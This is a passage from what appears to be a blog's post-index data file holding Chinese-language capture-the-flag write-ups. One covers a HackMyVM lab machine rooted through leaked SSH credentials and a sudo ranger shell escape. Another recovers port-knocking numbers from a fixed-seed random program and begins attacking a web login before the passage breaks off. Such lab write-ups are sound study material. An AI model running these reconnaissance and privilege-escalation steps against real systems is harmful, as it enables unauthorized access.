HTTP/1.1 200 OK\n< Date: Mon, 19 May 2025 03:11:15 GMT\n< Server: Apache/2.4.62 (Debian)\n< Last-Modified: Sun, 18 May 2025 13:52:35 GMT\n< ETag: '64d-6356953de9708'\n< Accept-Ranges: bytes\n< Content-Length: 1613\n< Vary: Accept-Encoding\n< Content-Type: text/html\n<\n<h1>\n<pre>\n                                   .     **\n                                 *           *.\n                                               ,*\n                                                  *,\n                          ,                         ,*\n                       .,                              *,\n                     /                                    *\n                  ,*                                        *,\n                /.                                            .*.\n              *                                                  **\n              ,*                                               ,*\n                 **                                          *.\n                    **                                    **.\n                      ,*                                **\n                         *,                          ,*\n                            *                      **\n                              *,                .*\n                                 *.           **\n                                   **      ,*,\n                                      ** *,     HackMyVM\n\n   QQ Group:   660930334\n   </h1>\n</pre>\n* Connection\n```\n\nWeb \u9996\u9875\u5185\u5bb9\u4e3a\u5b57\u7b26\u753b\u53ca QQ \u7fa4\u53f7\uff0c\u672a\u53d1\u73b0\u76f4\u63a5\u53ef\u5229\u7528\u4fe1\u606f\u3002\n\n\u4f7f\u7528 `dirb` \u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ dirb http://192.168.205.218\n\n-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nSTART_TIME: Sun May 18 23:13:00 2025\nURL_BASE: http://192.168.205.218/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://192.168.205.218/ ----\n+ http://192.168.205.218/index.html (CODE:200|SIZE:1613)\n+ http://192.168.205.218/server-status (CODE:403|SIZE:280)\n\n-----------------\nEND_TIME: Sun May 18 23:13:03 2025\nDOWNLOADED: 4612 - FOUND: 2\n```\n\n**\u7ed3\u679c\uff1a** \u76ee\u5f55\u7206\u7834\u4ec5\u53d1\u73b0 `index.html` \u548c\u88ab\u7981\u6b62\u8bbf\u95ee\u7684 `server-status`\u3002Web \u670d\u52a1\u65b9\u9762\u672a\u627e\u5230\u660e\u663e\u7a81\u7834\u53e3\u3002\n\n### 2.2 SSH \u670d\u52a1\u63a2\u6d4b\u4e0e\u521d\u59cb\u8bbf\u95ee\n\n\u5c1d\u8bd5\u8fde\u63a5 SSH \u670d\u52a1\uff0c\u89c2\u5bdf\u5176 Banner \u4fe1\u606f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh root@192.168.205.218\n ____________\n( guest/guest )\n -------------\n        o   ^__^\n         o  (oo)\\_______\n            (__)\\       )\\/\\\n                ||----w |\n                ||     ||\nroot@192.168.205.218's password:\n```\n\n**\u53d1\u73b0\uff1a** SSH Banner \u6cc4\u9732\u4e86\u51ed\u636e `guest/guest`\u3002\n\n\u4f7f\u7528\u6cc4\u9732\u7684\u51ed\u636e `guest:guest` \u767b\u5f55 SSH\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh guest@192.168.205.218\nPassword: guest\n# \u6210\u529f\u767b\u5f55\nguest@Qingmei:~$ id\nuid=1000(guest) gid=1000(guest) groups=1000(guest)\n```\n\n**\u7ed3\u679c\uff1a** \u6210\u529f\u4ee5 `guest` \u7528\u6237\u8eab\u4efd\u83b7\u5f97\u5bf9\u7cfb\u7edf\u7684\u521d\u59cb\u8bbf\u95ee\u6743\u9650\u3002\n\n## 3. \u6743\u9650\u63d0\u5347\n\n### 3.1 \u6743\u9650\u63d0\u5347\uff1aguest -> morri\n\n\u767b\u5f55\u540e\uff0c\u5bf9 `guest` \u7528\u6237\u8fdb\u884c\u672c\u5730\u679a\u4e3e\u3002\n\n#### 3.1.1 \u5bb6\u76ee\u5f55\u68c0\u67e5\u4e0e sudo \u6743\u9650\n\n\u67e5\u770b `guest` \u7528\u6237\u5bb6\u76ee\u5f55\u5185\u5bb9\u53ca `sudo` \u6743\u9650\uff1a\n\n```bash\nguest@Qingmei:~$ ls -la\ntotal 28\ndrwxr-xr-x 2 guest guest 4096 May 18 22:57 .\ndrwxr-xr-x 4 root  root  4096 May 18 09:55 ..\n-rw-r--r-- 1 root  root   166 May 18 09:55 banner\n-rw-r--r-- 1 guest guest  220 May 18 09:54 .bash_logout\n-rw-r--r-- 1 guest guest 3543 May 18 09:55 .bashrc\n-rw------- 1 guest guest   31 May 18 22:32 .lesshst\n-rw-r--r-- 1 guest guest  807 May 18 09:54 .profile\n\nguest@Qingmei:~$ cat banner\n ____________\n< Are u ok ? >\n -------------\n        \\   ^__^\n         \\  (oo)\\_______\n            (__)\\       )\\/\\\n                ||----w |\n                ||     ||\n\nguest@Qingmei:~$ sudo -l\n[sudo] password for guest: guest\nSorry, user guest may not run sudo on Qingmei.\n```\n\n**\u7ed3\u679c\uff1a** `guest` \u7528\u6237\u65e0 `sudo` \u6743\u9650\u3002\u5bb6\u76ee\u5f55\u4e0b\u7684 `banner` \u6587\u4ef6\u5185\u5bb9\u5982\u4e0a\u3002\n\n#### 3.1.2 SUID \u6587\u4ef6\u68c0\u67e5\n\n```bash\nguest@Qingmei:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n```\n\n**\u7ed3\u679c\uff1a** \u672a\u53d1\u73b0\u975e\u6807\u51c6\u7684 SUID \u53ef\u6267\u884c\u6587\u4ef6\u3002\n\n#### 3.1.3 \u68c0\u67e5 `/opt` \u76ee\u5f55\n\n```bash\nguest@Qingmei:~$ cd /opt/\nguest@Qingmei:/opt$ ls -al\ntotal 32\ndrwxr-xr-x  2 root root  4096 May 18 10:12 .\ndrwxr-xr-x 18 root root  4096 Mar 18 20:37 ..\n-rw-r--r--  1 root root   169 May 18 09:53 banner.txt\n-rwx-----x  1 root root 17024 May 18 10:12 morri_password\n```\n\n**\u53d1\u73b0\uff1a** \u5728 `/opt` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `morri_password` \u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5176\u6240\u6709\u8005\u4e3a `root`\uff0c\u4f46 `guest` \u7528\u6237\uff08\u5c5e\u4e8e `others`\uff09\u5177\u6709\u6267\u884c\u6743\u9650\u3002\n\n\u5c1d\u8bd5\u6267\u884c\u8be5\u7a0b\u5e8f\u5e76\u67e5\u770b\u5e2e\u52a9\u4fe1\u606f\uff1a\n\n```bash\nguest@Qingmei:/opt$ ./morri_password\nYou need to input strings of 'A's with correct lengths (10-50 characters).\nYou'll be asked to do this 10 times.\n\nTry 1/10: Please input exactly 26 'A's: ^C\n\nguest@Qingmei:/opt$ ./morri_password -h\nUsage: ./program [options]\nOptions:\n  -h          Show this help message\n  --dashazi   Directly output credentials\n\nNormal operation:\n  The program will ask you to input strings of 'A's with random lengths (10-50)\n  You need to correctly input 10 times to get the credentials\n```\n\n**\u53d1\u73b0\uff1a** \u7a0b\u5e8f\u5b58\u5728 `--dashazi` \u9009\u9879\u53ef\u4ee5\u76f4\u63a5\u8f93\u51fa\u51ed\u636e\u3002\n\n#### 3.1.4 \u83b7\u53d6 `morri` \u7528\u6237\u51ed\u636e\n\n\u4f7f\u7528 `--dashazi` \u9009\u9879\u6267\u884c\u7a0b\u5e8f\uff1a\n\n```bash\nguest@Qingmei:/opt$ ./morri_password --dashazi\nuser:morri pass:morri\n```\n\n**\u7ed3\u679c\uff1a** \u6210\u529f\u83b7\u53d6\u7528\u6237 `morri` \u7684\u51ed\u636e\u4e3a `morri:morri`\u3002\n\n#### 3.1.5 \u5207\u6362\u81f3 `morri` \u7528\u6237\u5e76\u83b7\u53d6 `user.txt`\n\n```bash\nguest@Qingmei:/opt$ su morri\nPassword: morri # \u8f93\u5165\u5bc6\u7801 morri\nmorri@Qingmei:/opt$ id\nuid=1001(morri) gid=1001(morri) groups=1001(morri)\nmorri@Qingmei:/opt$ cd ~\nmorri@Qingmei:~$ cat user.txt\nflag{user-edf050af-33ef-11f0-b3f0-000c2955ba04}\n```\n\n**\u7ed3\u679c\uff1a** \u6210\u529f\u5207\u6362\u5230 `morri` \u7528\u6237\u5e76\u8bfb\u53d6 `user.txt`\uff0c\u83b7\u53d6\u7b2c\u4e00\u4e2a flag\u3002\n\n### 3.2 \u6743\u9650\u63d0\u5347\uff1amorri -> root\n\n#### 3.2.1 Sudo \u6743\u9650\u68c0\u67e5 (morri)\n\n\u68c0\u67e5 `morri` \u7528\u6237\u7684 `sudo` \u6743\u9650\uff1a\n\n```bash\nmorri@Qingmei:~$ sudo -l\nMatching Defaults entries for morri on Qingmei:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser morri may run the following commands on Qingmei:\n    (ALL) NOPASSWD: /usr/bin/ranger\n```\n\n**\u53d1\u73b0\uff1a** `morri` \u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5 `root` \u6743\u9650\u6267\u884c `/usr/bin/ranger`\u3002\n\n#### 3.2.2 \u5229\u7528 `ranger` \u63d0\u6743\n\n`ranger` \u662f\u4e00\u4e2a\u7ec8\u7aef\u6587\u4ef6\u7ba1\u7406\u5668\uff0c\u53ef\u4ee5\u901a\u8fc7\u5176\u5185\u7f6e\u7684 shell \u6267\u884c\u529f\u80fd\u6765\u83b7\u53d6 `root` shell\u3002\n\n1. \u6267\u884c `sudo /usr/bin/ranger`\u3002\n\n   ```bash\n   morri@Qingmei:~$ sudo /usr/bin/ranger\n   ```\n\n2. \u5728 `ranger` \u754c\u9762\u4e2d\uff0c\u6309\u4e0b `s` \u952e (\u6216 `:`) \u8fdb\u5165\u547d\u4ee4\u6a21\u5f0f\u3002\n\n3. \u8f93\u5165 `bash -p` (\u6216 `sh -p`) \u5e76\u56de\u8f66\u3002\u53c2\u6570 `-p` \u786e\u4fdd `bash` \u4ee5\u7279\u6743\u6a21\u5f0f\uff08effective UID as root\uff09\u542f\u52a8\u3002\n\n\u6267\u884c\u540e\uff0c\u6210\u529f\u8fd4\u56de\u4e00\u4e2a `root` shell\u3002\n\n```bash\n# \u6b64\u5904\u5df2\u662f root shell\nroot@Qingmei:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Qingmei:~# cat /root/root.txt\nflag{root-485ee7a8-33f0-11f0-afbc-000c2955ba04}\n```\n\n**\u7ed3\u679c\uff1a** \u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u5e76\u8bfb\u53d6 `root.txt`\uff0c\u83b7\u53d6\u7b2c\u4e8c\u4e2a flag\u3002\n\nsentence", "top": 0, "createdAt": 1751016851, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P126": {"htmlDir": "docs/post/shuo-dian-shi.html", "labels": ["\u5439\u6c34"], "postTitle": "\u8bf4\u70b9\u4e8b", "postUrl": "post/shuo-dian-shi.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/126", "commentNum": 0, "wordCount": 132, "description": "\u4e8b\u60c5\u7ecf\u8fc7\u5c31\u662f\u6211\u7535\u8111\u6709\u95ee\u9898\u5237\u4e86\u7cfb\u7edf\uff0c\u7136\u540e\u6211github\u548cgoogle\u90fd\u5f00\u4e86\u4e8c\u6b65\uff0c\u5168\u90e8\u6ca1\u4e86\uff0cso\n7r1umph\u662f\u6211\uff0c7r1umphk\u4e5f\u662f\u6211\n\u4ee5\u540e\u53d1\u5e03\u5c31\u53d1\u5728\u8fd9\u4e86\uff0c\u7136\u540ehmv\u548cthl\u5e73\u53f0\u5e94\u8be5\u4f1a\u521b\u4e00\u4e2a\u65b0\u53f7\u540d\u5b57\u662f7r1umphk\n\u5f53\u7136\u5982\u679c\u65e7\u535a\u5ba2\u6709\u7684wp\u6211\u4e0d\u4f1a\u4ea4\u4e86\n\u5c31\u8bf4\u8fd9\u4e48\u591asentence", "top": 0, "createdAt": 1751016856, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P127": {"htmlDir": "docs/post/nei-bu-_yulian.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_yulian", "postUrl": "post/nei-bu-_yulian.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/127", "commentNum": 0, "wordCount": 64684, "description": "![image-20250627200158237](https://7r1umphk.github.io/image/image20250627200158372.webp)\n\n\u7fa4\u5185\u9776\u673a\n\n\u5f00\u641e\n\n## \u4e00\u3001\u4fe1\u606f\u6536\u96c6\u4e0e\u53d1\u73b0\n\n\u6e17\u900f\u6d4b\u8bd5\u7684\u7b2c\u4e00\u6b65\u6c38\u8fdc\u662f\u4fe1\u606f\u6536\u96c6\u3002\u6211\u4eec\u9996\u5148\u9700\u8981\u786e\u5b9a\u76ee\u6807\u5728\u7f51\u7edc\u4e2d\u7684\u4f4d\u7f6e\u3002\n\n### 1.1 \u4e3b\u673a\u53d1\u73b0\n\n\u6211\u4eec\u5904\u4e8e `192.168.205.0/24` \u7f51\u6bb5\uff0c\u4f7f\u7528 `arp-scan` \u5bf9\u6574\u4e2aC\u6bb5\u8fdb\u884c\u626b\u63cf\uff0c\u4ee5\u53d1\u73b0\u5b58\u6d3b\u7684\u4e3b\u673a\u3002\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l                      \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.131 08:00:27:0f:fa:c2       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:f3:f6:bb       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.038 seconds (125.61 hosts/sec). 4 responded\n                 \n```\n\n\u6210\u529f\u53d1\u73b0\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.131`\u3002\n\n### 1.2 \u7aef\u53e3\u626b\u63cf\n\n\u786e\u5b9aIP\u540e\uff0c\u4f7f\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u63a2\u6d4b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.131\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:02 EDT\nNmap scan report for 192.168.205.131\nHost is up (0.00046s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE    SERVICE\n22/tcp   open     ssh\n80/tcp   open     http\n8080/tcp filtered http-proxy\nMAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.23 seconds\n                                                    \n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0cSSH\uff0822\u7aef\u53e3\uff09\u548cHTTP\uff0880\u7aef\u53e3\uff09\u670d\u52a1\u662f\u5f00\u653e\u7684\uff0c\u800c8080\u5173\u95ed\uff08\u6211\u672c\u8eab\u8bf4\u6765\u8bd5\u4e00\u4e0bLingMj\u7684\u538b\u6d4b\u5927\u6cd5\uff0c\u7ed3\u679c\u4e0d\u884c\uff09\uff0c\u90a3\u770b80\n\n## \u4e8c\u3001\u7aef\u53e3\u6572\u95e8\u4e0e\u670d\u52a1\u66b4\u9732\n\n\u8bbf\u95ee80\u7aef\u53e3\u7684Web\u670d\u52a1\uff0c\u6211\u4eec\u53d1\u73b0\u4e00\u4e2a\u6a21\u62df\u7684Linux\u7ec8\u7aef\u754c\u9762\u3002\n\n![image-20250627200436415](https://7r1umphk.github.io/image/image20250627200436564.webp)\n\n\u770b\u5230\u8fd9\u5c31\u6709\u70b9\u5047\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u770b\u6e90\u7801\u5427\n\n```\n<!DOCTYPE html>\n<html lang='en'>\n<head>\n  <meta charset='UTF-8'>\n  <title>Linux Terminal Simulator</title>\n  <style>\n    body {\n      background-color: #000;\n      color: #00ff00;\n      font-family: monospace;\n      margin: 0;\n      padding: 10px;\n    }\n    #terminal {\n      white-space: pre-wrap;\n      min-height: 90vh;\n      overflow-y: auto;\n    }\n    .line {\n      display: flex;\n      flex-wrap: wrap;\n    }\n    input {\n      background: none;\n      border: none;\n      color: #00ff00;\n      font-family: monospace;\n      font-size: 1em;\n      outline: none;\n      flex: 1;\n    }\n    ::selection {\n      background: #008000;\n    }\n  </style>\n</head>\n<body>\n  <div id='terminal'></div>\n\n  <script>\n    const terminal = document.getElementById('terminal');\n\n    const fileSystem = {\n      'home': {\n        'user': {\n          'file1.txt': 'Hello, this is file1.',\n          'notes.md': '# Notes\\nThis is a markdown file.'\n        }\n      },\n      'var': {\n        'log.txt': 'System log content here.'\n      },\n      'opt':{\n        'code':{\n            'test.c':`#include<stdio.h>\n#include<stdlib.h>\n\nint main()\n{\n        srand(114514);\n        for(int i = 0; i < 114514; i++)\n        {\n                rand();\n        }\n        printf('%d\\\\n',rand()%65535);\n\n        printf('%d\\\\n',rand()%65535);\n\n        printf('%d\\\\n',rand()%65535);\n\n\n        return 0;\n}`\n        }\n      }\n\n    };\n\n    let currentPath = ['home', 'user'];\n    let history = [];\n    let historyIndex = -1;\n\n    function getDir(pathArr, fs) {\n      let node = fs;\n      for (let part of pathArr) {\n        if (node[part] && typeof node[part] === 'object') {\n          node = node[part];\n        } else {\n          return null;\n        }\n      }\n      return node;\n    }\n\n    function getPathString() {\n      return '/' + currentPath.join('/');\n    }\n\n    function renderPrompt() {\n      return `user@linux:${getPathString()}$ `;\n    }\n\n    function printOutput(prompt, input, output) {\n      const block = document.createElement('div');\n      block.innerHTML = `\n        <div>${prompt}${input}</div>\n        <div>${output}</div>\n      `;\n      terminal.appendChild(block);\n    }\n\n    function createInputLine() {\n      const line = document.createElement('div');\n      line.className = 'line';\n\n      const promptSpan = document.createElement('span');\n      promptSpan.textContent = renderPrompt();\n\n      const input = document.createElement('input');\n      input.type = 'text';\n      input.autofocus = true;\n\n      line.appendChild(promptSpan);\n      line.appendChild(input);\n      terminal.appendChild(line);\n\n      input.focus();\n\n      input.addEventListener('keydown', (e) => {\n        if (e.key === 'Enter') {\n          const value = input.value.trim();\n          input.disabled = true;\n          runCommand(value);\n        } else if (e.key === 'ArrowUp') {\n          if (historyIndex > 0) {\n            historyIndex--;\n            input.value = history[historyIndex];\n          }\n        } else if (e.key === 'ArrowDown') {\n          if (historyIndex < history.length - 1) {\n            historyIndex++;\n            input.value = history[historyIndex];\n          } else {\n            input.value = '';\n          }\n        }\n      });\n    }\n\n    function runCommand(input) {\n      const prompt = renderPrompt();\n      if (input !== '') {\n        history.push(input);\n        historyIndex = history.length;\n      }\n\n      function escapeHTML(str) {\n            return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');\n    }\n\n      const args = input.split(' ');\n      const cmd = args[0];\n      const param = args.slice(1);\n      const currentDir = getDir(currentPath, fileSystem);\n      let output = '';\n\n      switch (cmd) {\n        case 'help':\n          output = '\u547d\u4ee4: help, clear, echo, ls, cd, cat, date';\n          break;\n        case 'clear':\n          terminal.innerHTML = '';\n          createInputLine();\n          return;\n        case 'echo':\n          output = param.join(' ');\n          break;\n        case 'date':\n          output = new Date().toString();\n          break;\n        case 'ls':\n          if (currentDir) {\n            output = Object.keys(currentDir).join('  ');\n          } else {\n            output = '\u65e0\u6cd5\u8bbf\u95ee\u5f53\u524d\u76ee\u5f55';\n          }\n          break;\n        case 'cd':\n          if (param.length === 0 || param[0] === '~') {\n            currentPath = ['home', 'user'];\n          } else if (param[0] === '..') {\n            if (currentPath.length > 0) currentPath.pop();\n          } else {\n            const target = param[0];\n            const newPath = [...currentPath, target];\n            const targetDir = getDir(newPath, fileSystem);\n            if (targetDir && typeof targetDir === 'object') {\n              currentPath = newPath;\n            } else {\n              output = `cd: \u6ca1\u6709\u8fd9\u4e2a\u76ee\u5f55: ${target}`;\n            }\n          }\n          break;\n        case 'cat':\n          if (param.length === 0) {\n            output = 'cat: \u9700\u8981\u6587\u4ef6\u540d\u53c2\u6570';\n          } else {\n            const file = param[0];\n            if (currentDir[file] && typeof currentDir[file] === 'string') {\n              output = escapeHTML(currentDir[file]);\n            } else {\n              output = `cat: \u627e\u4e0d\u5230\u6587\u4ef6 ${file}`;\n            }\n          }\n          break;\n        case '':\n          output = '';\n          break;\n        default:\n          output = `\u672a\u627e\u5230\u547d\u4ee4: ${cmd}`;\n      }\n\n      printOutput(prompt, input, output);\n      createInputLine();\n      terminal.scrollTop = terminal.scrollHeight;\n    }\n\n    // \u521d\u59cb\u5316\n    createInputLine();\n    terminal.addEventListener('click', () => {\n      const inputs = terminal.querySelectorAll('input');\n      if (inputs.length > 0) inputs[inputs.length - 1].focus();\n    });\n  </script>\n</body>\n</html>\n\n```\n\n\u6252\u62c9\u7684\u65f6\u5019\u770b\u5230\u4e86\u4e00\u4e2a\u6587\u4ef6/opt/code/test.c\uff0c\u5904\u7406\u4e00\u4e0b\u5c31\u4e0b\u9762\u90a3\u6837\n\n```\n#include<stdio.h>\n#include<stdlib.h>\n\nint main()\n{\n        srand(114514); \n        for(int i = 0; i < 114514; i++)\n        {\n                rand();\n        }\n        printf('%d\\\\n',rand()%65535);\n\n        printf('%d\\\\n',rand()%65535);\n\n        printf('%d\\\\n',rand()%65535);\n\n\n        return 0;\n}\n```\n\n\u5047\u968f\u673a\u6570\n\n> **\u4f2a\u968f\u673a\u6570**\n>\n> \u8ba1\u7b97\u673a\u751f\u6210\u7684\u968f\u673a\u6570\u901a\u5e38\u662f\u4f2a\u968f\u673a\u7684\uff0c\u5b83\u4eec\u7531\u4e00\u4e2a\u521d\u59cb\u7684\u201c\u79cd\u5b50\u201d\uff08seed\uff09\u901a\u8fc7\u7279\u5b9a\u7b97\u6cd5\u751f\u6210\u3002\u5982\u679c\u79cd\u5b50\u56fa\u5b9a\uff0c\u90a3\u4e48\u540e\u7eed\u751f\u6210\u7684\u201c\u968f\u673a\u201d\u6570\u5e8f\u5217\u4e5f\u662f\u5b8c\u5168\u56fa\u5b9a\u548c\u53ef\u9884\u6d4b\u7684\u3002\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nano test.c\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat test.c \n#include<stdio.h>\n#include<stdlib.h>\n\nint main()\n{\n        srand(114514); \n        for(int i = 0; i < 114514; i++)\n        {\n                rand();\n        }\n        printf('%d\\\\n',rand()%65535);\n\n        printf('%d\\\\n',rand()%65535);\n\n        printf('%d\\\\n',rand()%65535);\n\n\n        return 0;\n}\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ gcc test.c -o test\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ./test     \n6440\\n17226\\n31925\\n                                                             \n```\n\n\u770b\u5230\u8fd9\u4e09\u4e2a\u6570\u5927\u6982\u731c\u5230\u8981\u5e72\u561b\u4e86\uff0c\u6572\u95e8\n\n> **\u7aef\u53e3\u6572\u95e8\uff08Port Knocking\uff09**\n>\n> \u8fd9\u662f\u4e00\u79cd\u901a\u8fc7\u5411\u76ee\u6807\u4e3b\u673a\u9884\u5148\u5b9a\u4e49\u597d\u7684\u4e00\u7cfb\u5217\u7aef\u53e3\u53d1\u9001\u8bf7\u6c42\uff08\u201c\u6572\u95e8\u201d\uff09\uff0c\u6765\u52a8\u6001\u5f00\u542f\u67d0\u4e2a\u7279\u5b9a\u670d\u52a1\u7aef\u53e3\u7684\u5b89\u5168\u673a\u5236\u3002\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ knock 192.168.205.131 6440 17226 31925\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ knock 192.168.205.131 6440 17226 31925\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ knock 192.168.205.131 6440 17226 31925        \n```\n\n\u6572\u95e8\u7a0b\u5e8f\u6709\u6982\u7387\u62bd\u98ce\uff0c\u6240\u4ee5\u591a\u6572\u51e0\u6b21\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nmap -p- 192.168.205.131              \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:11 EDT\nNmap scan report for 192.168.205.131\nHost is up (0.00065s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\nMAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds                     \n```\n\n8080\u5f00\u4e86\uff0c\u53bb\u770b\u4e00\u4e0b\n\n## \u4e09\u3001Web\u5e94\u7528\u6e17\u900f\uff1a\u4eceLFI\u5230RCE\n\n![image-20250627201136754](https://7r1umphk.github.io/image/image20250627201136940.webp)\n\n### 3.1 \u5f31\u53e3\u4ee4\u7206\u7834\u4e0e\u8ba4\u8bc1\u7ed5\u8fc7\n\n\u767b\u5f55\uff0c\u5c1d\u8bd5\u5f31\u5bc6\u7801\n\n![image-20250627201201451](https://7r1umphk.github.io/image/image20250627201201647.webp)\n\n\u767b\u4e0d\u4e0a\uff0c\u4f46\u662f\u770b\u5230\u4e00\u4e2a\u8c8c\u4f3c\u53ef\u4ee5\u6ce8\u5165\u7684\u5730\u65b9\uff0c\u770b\u770b\u6e90\u7801\u5148\n\n```\n<!DOCTYPE html>\n<html lang='zh-CN'>\n<head>\n    <meta charset='UTF-8'>\n    <title>\u7528\u6237\u767b\u5f55</title>\n    <style>\n        body {\n            font-family: 'Segoe UI', sans-serif;\n            background: linear-gradient(to right, #74ebd5, #ACB6E5);\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            height: 100vh;\n            margin: 0;\n        }\n\n        .login-container {\n            background: white;\n            padding: 40px;\n            border-radius: 12px;\n            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);\n            width: 300px;\n        }\n\n        .login-container h2 {\n            text-align: center;\n            margin-bottom: 24px;\n            color: #333;\n        }\n\n        .login-container input[type='text'],\n        .login-container input[type='password'] {\n            width: 100%;\n            padding: 12px;\n            margin-bottom: 20px;\n            border: 1px solid #ccc;\n            border-radius: 8px;\n            box-sizing: border-box;\n        }\n\n        .login-container input[type='submit'] {\n            width: 100%;\n            padding: 12px;\n            background-color: #4CAF50;\n            color: white;\n            border: none;\n            border-radius: 8px;\n            cursor: pointer;\n            font-size: 16px;\n        }\n\n        .login-container input[type='submit']:hover {\n            background-color: #45a049;\n        }\n\n        .message {\n            color: red;\n            text-align: center;\n            margin-top: 10px;\n        }\n    </style>\n</head>\n<body>\n<div class='login-container'>\n    <h2>\u767b\u5f55</h2>\n    <form method='post' action='/login'>\n        <input type='text' name='username' placeholder='\u7528\u6237\u540d' required>\n        <input type='password' name='password' placeholder='\u5bc6\u7801' required>\n        <input type='submit' value='\u767b\u5f55'>\n    </form>\n    <div class='message'>\n        <!-- \u540e\u7aef\u53ef\u4ee5\u901a\u8fc7\u91cd\u5b9a\u5411\u53c2\u6570\u663e\u793a\u5931\u8d25\u4fe1\u606f -->\n        <span id='error-message'></span>\n    </div>\n</div>\n<script>\n    const urlParams = new URLSearchParams(window.location.search);\n    const error = urlParams.get('error');\n    if (error) {\n        document.getElementById('error-message').innerText = decodeURIComponent(error);\n    